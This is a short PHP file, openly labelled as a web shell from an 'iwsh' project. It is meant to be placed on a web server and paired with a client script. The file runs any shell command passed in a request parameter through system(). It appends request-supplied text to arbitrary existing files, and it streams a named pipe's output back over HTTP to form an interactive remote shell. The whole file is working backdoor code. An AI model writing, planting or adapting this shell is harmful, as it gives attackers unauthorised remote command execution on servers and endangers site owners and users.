<?php
/*
*   Created by NumquamScire for iwsh project.
*   Access to full interactive web shell use client iwsh.sh -u http://localhost/PATH_TO_FILE/iwsh.php -d
*/

if (isset($_REQUEST['o']) || isset($_REQUEST['i']) || isset($_REQUEST['c']) || isset($_REQUEST['fi'])) {
    if(isset($_REQUEST['i'])){
        if(isset($_REQUEST['fi'])) {
            $fi = $_REQUEST['fi'];
        } else {
            exit;
        }
        $command = $_REQUEST['i'];
        if (file_exists($fi)) {
            file_put_contents($fi, $command , FILE_APPEND);
        }
    }
    if(isset($_REQUEST['c'])){
        $command = $_REQUEST['c'];
        system($_REQUEST['c']);
    }
    if (isset($_REQUEST['o'])) {
        ob_end_flush();
        header_remove();
        header_remove('Status'); 
        header_remove('Date');
        header_remove('Connection');
        header_remove('Content-Type');
        function sendChunk($data) {
            echo $data;
            flush();
        }
        $pipe = fopen($_REQUEST['o'], 'r');
        if (!$pipe) {
            exit;
        }
        stream_set_blocking($pipe, 0);
        while (true) {
            if (!file_exists($_REQUEST['o'])) {
                break;
            }
            $read = [$pipe];
            $write = null;
            $except = null;
            if (stream_select($read, $write, $except, 0, 0) > 0) {
                $data = fread($pipe, 4096); 
                if ($data === false || feof($pipe)) {
                    break;
                }
                sendChunk($data);
                continue;
            }
            usleep(100000); 
        }
        fclose($pipe);
        ob_end_flush();
    }
    exit;
}
?>
